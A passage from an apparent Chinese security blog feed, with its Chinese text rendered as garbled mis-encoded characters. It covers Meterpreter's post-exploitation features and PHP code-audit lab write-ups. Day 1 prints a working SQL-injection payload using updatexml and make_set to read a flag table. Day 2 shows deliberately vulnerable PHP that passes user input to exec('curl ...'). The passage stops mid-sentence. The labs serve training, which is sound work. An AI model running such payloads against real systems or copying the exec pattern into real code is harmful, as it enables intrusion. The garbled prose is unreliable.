</p><p>Meterpreteræ˜¯Metasploitæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œä½œä¸ºæº¢å‡ºæˆåŠŸä»¥åçš„æ”»å‡»è½½è·ä½¿ç”¨ï¼Œæ”»å‡»è½½è·åœ¨æº¢å‡ºæ”»å‡»æˆåŠŸä»¥åç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªæ§åˆ¶é€šé“ã€‚ä½¿ç”¨å®ƒä½œä¸ºæ”»å‡»è½½è·èƒ½å¤Ÿè·å¾—ç›®æ ‡ç³»ç»Ÿçš„ä¸€ä¸ªMeterpreter shellçš„é“¾æ¥ã€‚Meterpreter shellä½œä¸ºæ¸—é€æ¨¡å—æœ‰å¾ˆå¤šæœ‰ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€éšè—ä¸€äº›ä¸œè¥¿ã€æ‰“å¼€shellã€å¾—åˆ°ç”¨æˆ·å¯†ç ã€ä¸Šä¼ ä¸‹è½½è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶ã€è¿è¡Œcmd.exeã€æ•æ‰å±å¹•ã€å¾—åˆ°è¿œç¨‹æ§åˆ¶æƒã€æ•è·æŒ‰é”®ä¿¡æ¯ã€æ¸…é™¤åº”ç”¨ç¨‹åºã€æ˜¾ç¤ºè¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€æ˜¾ç¤ºè¿œç¨‹æœºå™¨çš„ç½‘ç»œæ¥å£å’ŒIPåœ°å€ç­‰ä¿¡æ¯ã€‚å¦å¤–Meterpreterèƒ½å¤Ÿèº²é¿å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚åœ¨è¿œç¨‹ä¸»æœºä¸Šéšè—è‡ªå·±,å®ƒä¸æ”¹å˜ç³»ç»Ÿç¡¬ç›˜ä¸­çš„æ–‡ä»¶,å› æ­¤HIDS[åŸºäºä¸»æœºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ]å¾ˆéš¾å¯¹å®ƒåšå‡ºå“åº”ã€‚æ­¤å¤–å®ƒåœ¨è¿è¡Œçš„æ—¶å€™ç³»ç»Ÿæ—¶é—´æ˜¯å˜åŒ–çš„,æ‰€ä»¥è·Ÿè¸ªå®ƒæˆ–è€…ç»ˆæ­¢å®ƒå¯¹äºä¸€ä¸ªæœ‰ç»éªŒçš„äººä¹Ÿä¼šå˜å¾—éå¸¸å›°éš¾ã€‚</p></blockquote><p>+++</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;å®éªŒç¯å¢ƒï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ”»å‡»æœºï¼šKaliï¼ˆ192.168.40.128ï¼‰&lt;/p&gt;
&lt;p&gt;é¶æœºï¼šWin7ï¼ˆ192.168.40.142ï¼‰&lt;/p&gt;
&lt;p&gt;+++&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ”»å‡»è¿‡ç¨‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;
      
    
    </summary>
    
    
      <category term="Demo" scheme="https://singlemindedt.github.io/tags/Demo/"/>
    
      <category term="æ¸—é€" scheme="https://singlemindedt.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHP-Audit-Labs</title>
    <link href="https://singlemindedt.github.io/2020/05/03/PHP-Audit-Labs/"/>
    <id>https://singlemindedt.github.io/2020/05/03/PHP-Audit-Labs/</id>
    <published>2020-05-03T00:45:59.000Z</published>
    <updated>2020-05-10T09:03:01.301Z</updated>
    
    <content type="html"><![CDATA[<h2 id="çº¢æ—¥å®‰å…¨-ä»£ç å®¡è®¡Day1-in-arrayå‡½æ•°ç¼ºé™·"><a href="#çº¢æ—¥å®‰å…¨-ä»£ç å®¡è®¡Day1-in-arrayå‡½æ•°ç¼ºé™·" class="headerlink" title="[çº¢æ—¥å®‰å…¨]ä»£ç å®¡è®¡Day1 - in_arrayå‡½æ•°ç¼ºé™·"></a>[çº¢æ—¥å®‰å…¨]ä»£ç å®¡è®¡Day1 - in_arrayå‡½æ•°ç¼ºé™·</h2><h2 id="ä¸€ã€å…³äºin-array"><a href="#ä¸€ã€å…³äºin-array" class="headerlink" title="ä¸€ã€å…³äºin_array"></a>ä¸€ã€å…³äºin_array</h2><ol><li><strong>å®šä¹‰å’Œç”¨æ³•</strong></li></ol><p><strong>in_array()</strong> å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚</p><blockquote><p><strong>æ³¨é‡Šï¼š</strong>å¦‚æœ <em>search</em> å‚æ•°æ˜¯å­—ç¬¦ä¸²ä¸” <em>type</em> å‚æ•°è¢«è®¾ç½®ä¸º TRUEï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚</p></blockquote><ol start="2"><li><strong>è¯­æ³•</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,<span class="keyword">array</span>,type)</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/10/Y341Qx.png" alt="Y341Qx.png"><br>| å‚æ•°     | æè¿°                                                         |<br>| :â€”â€”- | :â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ |<br>| <em>search</em> | å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚                                 |<br>| <em>array</em>  | å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚                                     |<br>| <em>type</em>   | å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚ |</p><blockquote><p>æ¥æºï¼š<a href="http://www.W3school.com.cn;[PHPæ‰‹å†Œ](https://www.php.net/parse_url)" target="_blank" rel="noopener">www.W3school.com.cn;[PHPæ‰‹å†Œ](https://www.php.net/parse_url)</a></p></blockquote><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p><img src="https://s1.ax1x.com/2020/05/10/Y34tTe.png" alt="Y34tTe.png"><br>[day1-2]:()<br><img src="https://s1.ax1x.com/2020/05/10/Y348OK.png" alt="Y348OK.png"><br><strong>è€ƒå¯Ÿç‚¹ï¼š</strong></p><ul><li><strong>in_array</strong>ç»•è¿‡</li><li>ä½¿ç”¨æ‹¼æ¥å‡½æ•°<strong>updatexml</strong>æ³¨å…¥</li></ul><p>+++</p><h3 id="1-in-arrayç»•è¿‡"><a href="#1-in-arrayç»•è¿‡" class="headerlink" title="1.in_arrayç»•è¿‡"></a>1.<strong>in_array</strong>ç»•è¿‡</h3><p>å…³é”®ä»£ç ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/10/Y34lS1.png" alt="Y34lS1.png"></p><ul><li><strong>connect_error()</strong></li></ul><p><strong>(1)å®šä¹‰å’Œç”¨æ³•</strong></p><p>mysqli_connect_error() å‡½æ•°è¿”å›ä¸Šä¸€æ¬¡è¿æ¥é”™è¯¯çš„é”™è¯¯æè¿°ã€‚</p><hr><p><strong>(2)è¯­æ³•</strong></p><p><code>mysqli_connect_error();</code></p><p><strong>(3)ç»†èŠ‚</strong></p><table><thead><tr><th align="left">è¿”å›å€¼ï¼š</th><th>è¿”å›ä¸€ä¸ªæè¿°é”™è¯¯çš„å­—ç¬¦ä¸²ã€‚å¦‚æœæ²¡æœ‰é”™è¯¯å‘ç”Ÿåˆ™è¿”å› NULLã€‚</th></tr></thead><tbody><tr><td align="left">PHP ç‰ˆæœ¬ï¼š</td><td>5+</td></tr></tbody></table><ul><li><strong>fetch_assoc()</strong></li></ul><p><strong>ï¼ˆ1ï¼‰å®šä¹‰å’Œç”¨æ³•</strong></p><p>mysqli_fetch_assoc() å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>è¯¥å‡½æ•°è¿”å›çš„å­—æ®µåæ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚</p><hr><p><strong>ï¼ˆ2ï¼‰è¯­æ³•ï¼š</strong></p><p><code>mysqli_fetch_assoc(result);</code></p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>result</em></td><td align="left">å¿…éœ€ã€‚è§„å®šç”± mysqli_query()ã€mysqli_store_result() æˆ– mysqli_use_result() è¿”å›çš„ç»“æœé›†æ ‡è¯†ç¬¦ã€‚</td></tr></tbody></table><p><strong>ï¼ˆ3ï¼‰ç»†èŠ‚ï¼š</strong></p><table><thead><tr><th align="left">è¿”å›å€¼ï¼š</th><th>è¿”å›ä»£è¡¨è¯»å–è¡Œçš„å…³è”æ•°ç»„ã€‚å¦‚æœç»“æœé›†ä¸­æ²¡æœ‰æ›´å¤šçš„è¡Œåˆ™è¿”å› NULLã€‚</th></tr></thead><tbody><tr><td align="left">PHP ç‰ˆæœ¬ï¼š</td><td>5+</td></tr></tbody></table><p>+++</p><ul><li><strong>query()</strong></li></ul><p><strong>(1)å®šä¹‰å’Œç”¨æ³•</strong></p><p>mysqli_query() å‡½æ•°æ‰§è¡ŒæŸä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚</p><hr><p><strong>(2)è¯­æ³•</strong></p><p><code>mysqli_query(connection,query,resultmode);</code></p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>connection</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„ MySQL è¿æ¥ã€‚</td></tr><tr><td align="left"><em>query</em></td><td align="left">å¿…éœ€ï¼Œè§„å®šæŸ¥è¯¢å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>resultmode</em></td><td align="left">å¯é€‰ã€‚ä¸€ä¸ªå¸¸é‡ã€‚å¯ä»¥æ˜¯ä¸‹åˆ—å€¼ä¸­çš„ä»»æ„ä¸€ä¸ªï¼šMYSQLI_USE_RESULTï¼ˆå¦‚æœéœ€è¦æ£€ç´¢å¤§é‡æ•°æ®ï¼Œè¯·ä½¿ç”¨è¿™ä¸ªï¼‰MYSQLI_STORE_RESULTï¼ˆé»˜è®¤ï¼‰</td></tr></tbody></table><p><strong>(3)ç»†èŠ‚</strong></p><table><thead><tr><th align="left">è¿”å›å€¼ï¼š</th><th>é’ˆå¯¹æˆåŠŸçš„ SELECTã€SHOWã€DESCRIBE æˆ– EXPLAIN æŸ¥è¯¢ï¼Œå°†è¿”å›ä¸€ä¸ª mysqli_result å¯¹è±¡ã€‚é’ˆå¯¹å…¶ä»–æˆåŠŸçš„æŸ¥è¯¢ï¼Œå°†è¿”å› TRUEã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› FALSEã€‚</th></tr></thead><tbody><tr><td align="left">PHP ç‰ˆæœ¬ï¼š</td><td>5+</td></tr><tr><td align="left">æ›´æ–°æ—¥å¿—ï¼š</td><td>åœ¨ PHP 5.3.0 ä¸­æ–°å¢äº†å¼‚æ­¥æŸ¥è¯¢çš„åŠŸèƒ½ã€‚</td></tr></tbody></table><p>+++</p><ul><li><strong>num_rows()</strong></li></ul><p><strong>(1)å®šä¹‰å’Œç”¨æ³•</strong></p><p>mysqli_num_rows() å‡½æ•°è¿”å›ç»“æœé›†ä¸­è¡Œçš„æ•°é‡ã€‚</p><hr><p><strong>(2)è¯­æ³•</strong></p><p><code>mysqli_num_rows(result);</code></p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>result</em></td><td align="left">å¿…éœ€ã€‚è§„å®šç”± mysqli_query()ã€mysqli_store_result() æˆ– mysqli_use_result() è¿”å›çš„ç»“æœé›†æ ‡è¯†ç¬¦ã€‚</td></tr></tbody></table><p><strong>(3)ç»†èŠ‚</strong></p><table><thead><tr><th align="left">è¿”å›å€¼ï¼š</th><th>è¿”å›ç»“æœé›†ä¸­è¡Œçš„æ•°é‡ã€‚</th></tr></thead><tbody><tr><td align="left">PHP ç‰ˆæœ¬ï¼š</td><td>5+</td></tr></tbody></table><p>+++</p><h4 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h4><p>åœ¨index.phpæ–‡ä»¶ä¸­ï¼Œç¬¬11è¡Œçš„<strong>if</strong>æ¡ä»¶è¯­å¥å¤„å¯ä»¥çœ‹å‡ºï¼Œç¨‹åºæŠŠç”¨æˆ·çš„IDå€¼å­˜å‚¨åœ¨ <strong>$whitelist</strong> æ•°ç»„ä¸­ï¼Œç„¶åå°†ç”¨æˆ·ä¼ å…¥çš„ <strong>id</strong> å‚æ•°å…ˆç»è¿‡config.phpæ–‡ä»¶ä¸­å®šä¹‰çš„<strong>stop_hackå‡½æ•°</strong>è¿‡æ»¤ï¼Œç„¶åå†ç”¨ <strong>in_array</strong> æ¥åˆ¤æ–­ç”¨æˆ·ä¼ å…¥çš„ <strong>id</strong> å‚æ•°æ˜¯å¦åœ¨ <strong>$whitelist</strong> æ•°ç»„ä¸­ï¼Œå¦‚æœä¸åœ¨ï¼Œè¿”å› id $id is not in whitelist. å¦‚æœåœ¨ï¼Œé‚£ä¹ˆæ‰§è¡ŒSQLè¯­å¥ï¼Œæœ€åè¿”å›æŸ¥è¯¢çš„å†…å®¹ã€‚è¿™é‡Œ <strong>in_array</strong> å‡½æ•°æ²¡æœ‰ä½¿ç”¨å¼ºåŒ¹é…ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œä¾‹å¦‚ï¼š <strong>id=1â€™</strong> æ˜¯å¯ä»¥æˆåŠŸç»•è¿‡ <strong>in_array</strong> å‡½æ•°çš„ã€‚config.phpæ–‡ä»¶ä¸­<strong>stop_hackå‡½æ•°</strong>ï¼Œè¿™æ˜¯ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼Œä¸»è¦è¿‡æ»¤äº†å­—ç¬¦ä¸²æ‹¼æ¥å‡½æ•°ï¼Œå¯¼è‡´æˆ‘ä»¬æ²¡æ³•ç›´æ¥é€šè¿‡union selctæˆ–è€…å¸¸è§çš„hex()ç­‰æ–¹å¼æ¥å¾—åˆ°flagã€‚</p><p>+++</p><h3 id="2-ä½¿ç”¨æ‹¼æ¥å‡½æ•°updatexmlæ³¨å…¥"><a href="#2-ä½¿ç”¨æ‹¼æ¥å‡½æ•°updatexmlæ³¨å…¥" class="headerlink" title="2. ä½¿ç”¨æ‹¼æ¥å‡½æ•°updatexmlæ³¨å…¥"></a>2. ä½¿ç”¨æ‹¼æ¥å‡½æ•°<strong>updatexml</strong>æ³¨å…¥</h3><h5 id="å…³äºUPDATEXML-XML-document-XPath-string-new-value"><a href="#å…³äºUPDATEXML-XML-document-XPath-string-new-value" class="headerlink" title="å…³äºUPDATEXML (XML_document, XPath_string, new_value);"></a>å…³äº<strong>UPDATEXML (XML_document, XPath_string, new_value);</strong></h5><blockquote><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string(Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p></blockquote><p><strong>æ³¨ï¼š</strong>Updatexmlå‡½æ•°æœ‰ä¸ªç‰¹æ€§ï¼Œå½“ updatexml æŸ¥è¯¢çš„æ•°æ®ä¸­åŒ…å«ç‰¹æ®Šå­—ç¬¦æˆ–è€…å­—æ¯ï¼Œå°±ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™ä¿¡æ¯ä¸ºç‰¹æ®Šå­—ç¬¦ã€å­—æ¯åŠä¹‹åçš„å†…å®¹ï¼Œå¦‚ï¼šæŸ¥è¯¢çš„æ•°æ®ä¸º99pandaï¼Œé‚£ä¹ˆç»“æœåªä¼šæ˜¾ç¤ºpandaã€‚</p><p>å› æ­¤è¿™é‡Œé€šè¿‡æŸ¥è¯¢database(),è¿”å›æ•°æ®åº“åï¼Œç„¶åCONCATå°†å…¶å­—ç¬¦ä¸²åŒ–ã€‚å› ä¸ºUpdateXmlç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼çš„å­—ç¬¦ä¸²,æ‰€ä»¥ä¸ç¬¦åˆè¦æ±‚ï¼Œç„¶åæŠ¥é”™ã€‚</p><p>ç”±äºå­—ç¬¦ä¸²æ‹¼æ¥å‡½æ•°è¢«è¿‡æ»¤äº†ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨concatç­‰å‡½æ•°æ„é€ è¯­å¥ï¼Œåªèƒ½é€‰æ‹©ä½¿ç”¨ä¸å¸¸ç”¨çš„å‡½æ•°â€”â€”make_set()å‡½æ•°ã€‚</p><h5 id="å…³äºMAKE-SET-bits-str1-str2-â€¦"><a href="#å…³äºMAKE-SET-bits-str1-str2-â€¦" class="headerlink" title="å…³äºMAKE_SET(bits,str1,str2,â€¦)"></a><strong>å…³äºMAKE_SET(bits,str1,str2,â€¦)</strong></h5><blockquote><p>è¿”å›ä¸€ä¸ªè®¾å®šå€¼(å«å­å­—ç¬¦ä¸²åˆ†éš”å­—ç¬¦ä¸²â€,â€å­—ç¬¦)ï¼Œåœ¨è®¾ç½®ä½çš„ç›¸åº”ä½çš„å­—ç¬¦ä¸²ã€‚str1å¯¹åº”äºä½0ï¼Œstr2åˆ°ç¬¬1ä½ï¼Œä¾æ­¤ç±»æ¨ã€‚åœ¨str1ï¼Œstr1æœ‰NULLå€¼ï¼Œâ€¦é‚£ä¹ˆä¸æ·»åŠ åˆ°ç»“æœã€‚</p></blockquote><blockquote><p>å‚è€ƒï¼š<a href="http://www.cnpanda.net/sec/276.html" target="_blank" rel="noopener">å…³äºUPDATEXMLå’Œmake_set()å‡½æ•°</a> </p></blockquote><p>å› æ­¤ï¼Œå¯æ„é€ æœ¬é¢˜çš„payloadï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?id=4 and (select updatexml(1,make_set(3,'~',(select flag from flag)),1))</span><br></pre></td></tr></table></figure><p>+++</p><h2 id="çº¢æ—¥å®‰å…¨-ä»£ç å®¡è®¡Day2-filter-varå‡½æ•°"><a href="#çº¢æ—¥å®‰å…¨-ä»£ç å®¡è®¡Day2-filter-varå‡½æ•°" class="headerlink" title="[çº¢æ—¥å®‰å…¨]ä»£ç å®¡è®¡Day2 -filter_varå‡½æ•°"></a>[çº¢æ—¥å®‰å…¨]ä»£ç å®¡è®¡Day2 -filter_varå‡½æ•°</h2><h2 id="äºŒã€å…³äºfilter-varå‡½æ•°"><a href="#äºŒã€å…³äºfilter-varå‡½æ•°" class="headerlink" title="äºŒã€å…³äºfilter_varå‡½æ•°"></a>äºŒã€å…³äºfilter_varå‡½æ•°</h2><ol><li><strong>å®šä¹‰å’Œç”¨æ³•</strong></li></ol><p>filter_var() å‡½æ•°é€šè¿‡æŒ‡å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤å˜é‡ã€‚</p><p>å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›å·²è¿‡æ»¤çš„æ•°æ®ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</p><ol start="2"><li><strong>è¯­æ³•</strong></li></ol><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter<span class="constructor">_var(<span class="params">variable</span>, <span class="params">filter</span>, <span class="params">options</span>)</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">variable</td><td align="left">å¿…éœ€ã€‚è§„å®šè¦è¿‡æ»¤çš„å˜é‡ã€‚(å˜é‡çš„å€¼åœ¨è¿‡æ»¤å‰ï¼Œä¼šè¢«è½¬æ¢æˆå­—ç¬¦ä¸²)</td></tr><tr><td align="left">filter</td><td align="left">å¯é€‰ã€‚è§„å®šè¦ä½¿ç”¨çš„è¿‡æ»¤å™¨çš„ IDã€‚</td></tr><tr><td align="left">options</td><td align="left">è§„å®šåŒ…å«æ ‡å¿—/é€‰é¡¹çš„æ•°ç»„ã€‚æ£€æŸ¥æ¯ä¸ªè¿‡æ»¤å™¨å¯èƒ½çš„æ ‡å¿—å’Œé€‰é¡¹ã€‚</td></tr></tbody></table><p><img src="https://s1.ax1x.com/2020/05/10/Y34YwD.png" alt="Y34YwD.png"></p><h3 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/sec-redclub.com$/'</span>,$site_info[<span class="string">'host'</span>]))&#123;</span><br><span class="line">        exec(<span class="string">'curl "'</span>.$site_info[<span class="string">'host'</span>].<span class="string">'"'</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">' '</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>+++</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$flag = <span class="string">"HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong></p><ul><li><strong>filter_var()</strong>ç»•è¿‡</li><li>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</li></ul><h4 id="è¡¥å……ï¼š"><a href="#è¡¥å……ï¼š" class="headerlink" title="è¡¥å……ï¼š"></a>è¡¥å……ï¼š</h4><ol><li><strong>exec()</strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>exec â€” æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº;</p><p>è¯´æ˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec ( string $command [, <span class="keyword">array</span> &amp;$output [, int &amp;$return_var ]] ) : string</span><br></pre></td></tr></table></figure><p><strong>exec()</strong> æ‰§è¡Œ <code>command</code> å‚æ•°æ‰€æŒ‡å®šçš„å‘½ä»¤ã€‚</p><p><strong>å‚æ•°ï¼š</strong></p><ul><li><p><strong>command</strong>ï¼šè¦æ‰§è¡Œçš„å‘½ä»¤ï¼›</p></li><li><p><strong>output</strong>ï¼šå¦‚æœæä¾›äº† <code>output</code> å‚æ•°ï¼Œ é‚£ä¹ˆä¼šç”¨å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºå¡«å……æ­¤æ•°ç»„ï¼Œ æ¯è¡Œè¾“å‡ºå¡«å……æ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚ æ•°ç»„ä¸­çš„æ•°æ®ä¸åŒ…å«è¡Œå°¾çš„ç©ºç™½å­—ç¬¦ï¼Œä¾‹å¦‚ <em>\n</em> å­—ç¬¦ã€‚ è¯·æ³¨æ„ï¼Œå¦‚æœæ•°ç»„ä¸­å·²ç»åŒ…å«äº†éƒ¨åˆ†å…ƒç´ ï¼Œ<strong>exec()</strong> å‡½æ•°ä¼šåœ¨æ•°ç»„æœ«å°¾è¿½åŠ å†…å®¹ã€‚å¦‚æœä½ ä¸æƒ³åœ¨æ•°ç»„æœ«å°¾è¿›è¡Œè¿½åŠ ï¼Œ è¯·åœ¨ä¼ å…¥ <strong>exec()</strong> å‡½æ•°ä¹‹å‰ å¯¹æ•°ç»„ä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a> å‡½æ•°è¿›è¡Œé‡ç½®ã€‚</p></li><li><p><strong>return_var</strong>:å¦‚æœåŒæ—¶æä¾› <code>output</code> å’Œ <code>return_var</code> å‚æ•°ï¼Œ å‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€ä¼šè¢«å†™å…¥åˆ°æ­¤å˜é‡ã€‚</p></li></ul><p><strong>è¿”å›å€¼</strong></p><p>å‘½ä»¤æ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œå†…å®¹ã€‚ å¦‚æœä½ éœ€è¦è·å–æœªç»å¤„ç†çš„å…¨éƒ¨è¾“å‡ºæ•°æ®ï¼Œ è¯·ä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.passthru.php" target="_blank" rel="noopener">passthru()</a> å‡½æ•°ã€‚</p><p>å¦‚æœæƒ³è¦è·å–å‘½ä»¤çš„è¾“å‡ºå†…å®¹ï¼Œ è¯·ç¡®ä¿ä½¿ç”¨ <code>output</code> å‚æ•°ã€‚</p><p>+++</p><ol start="2"><li><strong>parse_url()</strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>parse_url â€” è§£æ URLï¼Œè¿”å›å…¶ç»„æˆéƒ¨åˆ†ã€‚</p><p><strong>è¯´æ˜</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_url ( string `$url` [, int `$component` = <span class="number">-1</span> ] ) : [mixed](https:<span class="comment">//www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed)</span></span><br></pre></td></tr></table></figure><p>æœ¬å‡½æ•°è§£æä¸€ä¸ª URL å¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†ã€‚</p><p>æœ¬å‡½æ•°<em>ä¸æ˜¯</em>ç”¨æ¥éªŒè¯ç»™å®š URL çš„åˆæ³•æ€§çš„ï¼Œåªæ˜¯å°†å…¶åˆ†è§£ä¸ºä¸‹é¢åˆ—å‡ºçš„éƒ¨åˆ†ã€‚ä¸å®Œæ•´çš„ URL ä¹Ÿè¢«æ¥å—ï¼Œ<strong>parse_url()</strong> ä¼šå°è¯•å°½é‡æ­£ç¡®åœ°å°†å…¶è§£æã€‚</p><p><strong>å‚æ•°</strong></p><ul><li><p><code>url</code></p><p>è¦è§£æçš„ URLã€‚æ— æ•ˆå­—ç¬¦å°†ä½¿ç”¨ <em>_</em> æ¥æ›¿æ¢ã€‚</p></li><li><p><code>component</code></p><p>æŒ‡å®š 